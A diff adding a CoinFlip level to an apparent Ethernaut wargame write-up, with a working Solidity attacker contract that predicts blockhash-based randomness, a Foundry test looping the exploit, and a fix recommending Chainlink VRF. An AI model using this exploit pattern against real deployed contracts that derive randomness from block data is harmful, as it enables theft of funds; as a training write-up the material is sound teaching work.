@@ -106,3 +106,105 @@ contract Rubixi {
 ```
 
 This allowed the attacker to call the old constructor, claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
+
+---
+
+## Level 3: CoinFlip
+
+### Objective
+Guess the outcome of a coin flip correctly 10 consecutive times.
+
+### Vulnerability Analysis
+The smart contract attempts to generate randomness using on-chain data, specifically `blockhash(block.number - 1)`. In the Ethereum Virtual Machine (EVM), all state and block data are public and deterministic. There is no true randomness natively on-chain. 
+
+Because of this, an attacker can write a custom smart contract that copies the exact same mathematical logic. When the attacker contract calls the target contract, both execute within the same transaction and the exact same block. The attacker contract can pre-calculate the outcome using the current block's context and then pass the guaranteed correct answer to the target. 
+
+Additionally, the contract includes a spam protection mechanism (`if (lastHash == blockValue) revert();`), which prevents looping the attack in a single transaction. The exploit must be executed one transaction per block over 10 separate blocks.
+
+### Exploit Steps
+
+**Method 1: Remix IDE & Web3 (Cross-Contract Call)**
+1. **Deploy the Attacker Contract:** Use Remix IDE to deploy the following `Attacker` contract, passing your Ethernaut instance address into the constructor.
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+interface ICoinFlip {
+    function flip(bool guess) external returns (bool);
+}
+
+contract Attacker {
+    ICoinFlip public target;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = ICoinFlip(_target);
+    }
+
+    function attack() external {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        target.flip(side);
+    }
+}
+
+```
+
+2. **Execute and Wait:** Call the `attack()` function on your deployed contract. **Crucial:** You must wait for the transaction to be confirmed (a new block is mined) before pressing it again, otherwise the transaction will revert due to the `lastHash` check.
+3. **Repeat:** Repeat step 2 ten times. You can track your progress in the browser console using:
+
+```javascript
+(await contract.consecutiveWins()).toString()
+
+```
+
+**Method 2: Foundry (PoC)**
+
+In Foundry, we can simulate the passing of time (new blocks) using the cheatcode `vm.roll()`. This allows us to bypass the `lastHash` spam protection in a single test run.
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {CoinFlip} from "../src/03_CoinFilp/CoinFlip.sol";
+import {Attacker} from "../src/03_CoinFilp/Attacker.sol";
+
+contract CoinFilp_Solutions is Test {
+    CoinFlip coinFlipContract;
+    Attacker attackerContractl;
+
+    address public owner;
+    address public hacker;
+
+    function setUp() public {
+        owner = makeAddr("owner");
+        vm.prank(owner);
+        coinFlipContract = new CoinFlip();
+
+        hacker = makeAddr("hacker");
+        vm.prank(hacker);
+        attackerContractl = new Attacker(address(coinFlipContract));
+    }
+
+    function test_attack() public {
+        // Loop the attack 10 times
+        for (uint256 i = 0; i < 10; i++) {
+            // Simulate a new block being mined to bypass the 'lastHash' revert check
+            vm.roll(block.number + 1);
+
+            vm.prank(hacker);
+            attackerContractl.attack();
+        }
+
+        // Verify the hack was successful
+        assertEq(coinFlipContract.consecutiveWins(), 10, "Not reaching 10 consecutive wins!");
+    }
+}
+
+```
+
+### Mitigation (The Fix)
+
+Never use on-chain data like `blockhash`, `block.timestamp`, or `block.difficulty` as a source of randomness in smart contracts. They can be manipulated by miners or easily pre-calculated by attackers. To achieve secure, cryptographically verifiable randomness on the blockchain, you must use an off-chain Oracle service, such as **Chainlink VRF (Verifiable Random Function)**.
